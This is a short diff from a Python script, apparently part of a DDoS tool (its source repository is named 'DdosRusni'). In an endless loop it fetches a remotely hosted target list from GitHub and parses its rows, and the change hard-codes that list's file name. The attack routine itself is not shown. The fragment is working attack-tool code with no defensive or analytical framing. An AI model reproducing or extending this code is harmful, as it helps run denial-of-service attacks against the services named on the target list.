@@ -20,7 +20,7 @@ while 1 == 1:
  #   f.close
     testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
     print(testfile)
-    with open(filename,'r') as f:
+    with open("target.txt",'r') as f:
         for row in f:
             rrow = row.split()
             print (rrow)
